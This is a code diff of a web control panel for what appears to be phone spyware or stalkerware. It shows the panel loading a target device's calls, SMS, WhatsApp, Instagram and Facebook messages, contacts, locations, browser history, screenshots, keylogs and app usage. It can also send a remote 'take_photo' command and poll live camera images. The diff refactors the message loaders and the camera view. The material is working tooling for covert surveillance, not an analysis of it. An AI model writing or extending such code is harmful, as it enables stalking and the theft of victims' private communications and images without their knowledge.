-      select.innerHTML = '<option value="">No devices</option>';
     }
   }
 
   let photoPollingInterval = null, autoPhotoPolling = false;
-
-  async function takePhotoOnTarget() {
-    const select = document.getElementById('cameraDeviceSelect');
-    const deviceId = select?.value;
-    if (!deviceId) { alert('Select a device first'); return; }
-    document.getElementById('cameraMessage').innerText = 'Sending command...';
-    const res = await fetchAPI('/client/command', {
-      method: 'POST',
-      body: JSON.stringify({ deviceId, command: 'take_photo' })
-    });
-    if (res?.success) {
-      document.getElementById('cameraMessage').innerText = 'Command sent, fetching photo...';
-      setTimeout(pollForPhoto, 3000);
-    } else {
-      document.getElementById('cameraMessage').innerText = 'Failed to send command';
-    }
-  }
-
-  async function pollForPhoto() {
-    const res = await fetchAPI('/data/photos');
-    if (res?.success && res.data && res.data.length) {
-      const latest = res.data[0];
-      const img = document.getElementById('latestPhoto');
-      img.src = latest.imageBase64.startsWith('data:') ? latest.imageBase64 : `data:image/jpeg;base64,${latest.imageBase64}`;
-      img.style.display = 'block';
-      document.getElementById('cameraMessage').innerHTML = `Photo captured at ${new Date(latest.timestamp).toLocaleString()}`;
-    } else {
-      document.getElementById('cameraMessage').innerHTML = 'No photo yet. Retrying...';
-    }
-  }
-
+  function startPhotoPolling() { if (photoPollingInterval) clearInterval(photoPollingInterval); photoPollingInterval = setInterval(() => { if (autoPhotoPolling) loadLiveCamera(); }, 5000); }
   function togglePhotoPolling() {
     autoPhotoPolling = !autoPhotoPolling;
     const btn = document.getElementById('startPhotoPollingBtn');
-    if (autoPhotoPolling) {
-      if (photoPollingInterval) clearInterval(photoPollingInterval);
-      photoPollingInterval = setInterval(pollForPhoto, 5000);
-      btn.innerHTML = "🔄 Auto ON";
-      btn.style.background = "#0f0";
-      btn.style.color = "black";
-    } else {
-      if (photoPollingInterval) clearInterval(photoPollingInterval);
-      btn.innerHTML = "🔄 Auto OFF";
-      btn.style.background = "";
-      btn.style.color = "";
-    }
+    if (autoPhotoPolling) { startPhotoPolling(); btn.innerHTML = "🔄 Auto ON"; btn.style.background = "#0f0"; btn.style.color = "black"; }
+    else { if (photoPollingInterval) clearInterval(photoPollingInterval); btn.innerHTML = "🔄 Auto OFF"; btn.style.background = ""; btn.style.color = ""; }
   }
 
-  // Auto refresh logic
-  let autoRefreshActive = true;
-  let refreshInterval = null;
+  // Auto refresh
+  let autoRefreshActive = true, refreshInterval = null;
   function refreshCurrentTab() {
     const active = document.querySelector('.tab-content.active')?.id;
     if (active === 'dashboard') loadDashboard();
     else if (active === 'devices') loadDevices();
     else if (active === 'calls') loadCalls();
-    else if (active === 'messages') loadSMSMessages();
-    else if (active === 'social-whatsapp') loadSocialMessages('whatsapp', 'whatsappTable');
-    else if (active === 'social-instagram') loadSocialMessages('instagram', 'instagramTable');
-    else if (active === 'social-facebook') loadSocialMessages('facebook', 'facebookTable');
+    else if (active === 'messages') loadMessagesByApp('sms', 'messagesTable');
+    else if (active === 'social-whatsapp') loadMessagesByApp('whatsapp', 'whatsappTable');
+    else if (active === 'social-instagram') loadMessagesByApp('instagram', 'instagramTable');
+    else if (active === 'social-facebook') loadMessagesByApp('facebook', 'facebookTable');
     else if (active === 'contacts') loadContacts();
     else if (active === 'locations') loadLocations();
     else if (active === 'browser') loadBrowser();
     else if (active === 'screenshots') loadScreenshots();
     else if (active === 'keylogs') loadKeylogs();
     else if (active === 'appusage') loadAppUsage();
+    else if (active === 'livecamera') loadLiveCamera();
   }
-  function startAutoRefresh() {
-    if (refreshInterval) clearInterval(refreshInterval);
-    refreshInterval = setInterval(() => { if (autoRefreshActive) refreshCurrentTab(); }, 15000);
-  }
+  function startAutoRefresh() { if (refreshInterval) clearInterval(refreshInterval); refreshInterval = setInterval(() => { if (autoRefreshActive) refreshCurrentTab(); }, 15000); }
 
-  // Event binding and init
+  // Event listeners
   document.getElementById('refreshBtn')?.addEventListener('click', () => refreshCurrentTab());
   document.getElementById('autoRefreshToggleBtn')?.addEventListener('click', () => {
     autoRefreshActive = !autoRefreshActive;
@@ -812,7 +385,7 @@
   document.getElementById('logoutBtn')?.addEventListener('click', () => { localStorage.removeItem('token'); window.location.href = 'login.html'; });
   document.getElementById('centerLatestBtn')?.addEventListener('click', centerOnLatest);
   document.getElementById('liveTrackingBtn')?.addEventListener('click', toggleLiveTracking);
-  document.getElementById('takePhotoBtn')?.addEventListener('click', takePhotoOnTarget);
+  document.getElementById('refreshCameraBtn')?.addEventListener('click', loadLiveCamera);
   document.getElementById('startPhotoPollingBtn')?.addEventListener('click', togglePhotoPolling);
 
   // Sidebar menu
@@ -824,7 +397,7 @@
       document.getElementById(tabId)?.classList.add('active');
       document.querySelectorAll('.sidebar a').forEach(a => a.classList.remove('active'));
       link.classList.add('active');
-      if (tabId === 'livecamera') loadCameraDevices();
+      if (tabId === 'livecamera') loadLiveCamera();
       else if (tabId === 'locations') { if (!map) loadLocations(); else refreshCurrentTab(); }
       else refreshCurrentTab();
     });
@@ -846,16 +419,17 @@
   loadDashboard();
   loadDevices();
   loadCalls();
-  loadSMSMessages();
+  loadMessagesByApp('sms', 'messagesTable');
+  loadMessagesByApp('whatsapp', 'whatsappTable');
+  loadMessagesByApp('instagram', 'instagramTable');
+  loadMessagesByApp('facebook', 'facebookTable');
   loadContacts();
   loadLocations();
   loadBrowser();
   loadScreenshots();
   loadKeylogs();
   loadAppUsage();
-  loadSocialMessages('whatsapp', 'whatsappTable');
-  loadSocialMessages('instagram', 'instagramTable');
-  loadSocialMessages('facebook', 'facebookTable');
+  loadLiveCamera();
 </script>
 </body>
 </html>
